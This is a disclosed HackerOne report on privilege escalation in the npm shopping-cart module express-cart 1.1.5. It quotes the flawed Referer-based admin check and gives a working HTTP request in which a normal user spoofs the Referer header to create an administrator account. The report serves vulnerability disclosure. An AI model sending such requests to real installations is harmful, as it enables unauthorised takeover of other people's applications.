# Privilege escalation allows any user to add an administrator

## Report Details
- **Report ID**: 343626
- **URL**: https://hackerone.com/reports/343626
- **State**: Closed
- **Severity**: critical
- **Submitted**: 2018-04-26T20:55:17.826Z
- **Disclosed**: 2018-07-12T07:57:47.724Z

## Reporter
- **Username**: patrickrbc
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: nodejs-ecosystem

## Vulnerability Information
I would like to report privilege escalation in the npm module express-cart.

It allows a normal user to add another user with administrator privileges.

# Module

**module name:** express-cart
**version:** 1.1.5
**npm page:** `https://www.npmjs.com/package/express-cart`

## Module Description

expressCart is a fully functional shopping cart built in Node.js (Express, MongoDB) with Stripe, PayPal and Authorize.net payments.

## Module Stats

[10] weekly downloads

# Vulnerability

## Vulnerability Description

A deficiency in the access control allows normal users from expressCart to add new users to the application. This behavior by itself might be considered a privilege escalation. However, it was also possible to add the user as administrator.

## Steps To Reproduce:

Firstly, I noticed that all the endpoints located in the *user.js* file are not being restricted by the *common.restrict* middleware, as the other admin routes do.  Also, the endpoint */admin/user/insert* does not check if the user is admin before adding a new user, which I guess it would be a unlikely behavior.

The following code is used to check if it is the first time creating a user:

```
// set the account to admin if using the setup form. Eg: First user account
let urlParts = url.parse(req.header('Referer'));

let isAdmin = false;
if(urlParts.path === '/admin/setup'){
  isAdmin = true;
}
```

As you can see in the above snippet, if you send a request with a Referer containing the string */admin/setup* the user added will be considered an admin. For example:

```
POST /admin/user/insert HTTP/1.1
Host: localhost:1111
Referer: http://localhost:1111/admin/setup
Content-Type: application/x-www-form-urlencoded
Cookie: connect.sid=[NORMAL_USER_COOKIE]

usersName=NEWADMIN&userEmail=new@admin.com&userPassword=password&frm_userPassword_confirm=password
```

# Wrap up

- I contacted the maintainer to let them know: [N] 
- I opened an issue in the related repository: [N]

## Impact

This vulnerability would allow any registered user to create another user with administrator privileges and takeover the application.

## Attachments
No attachments
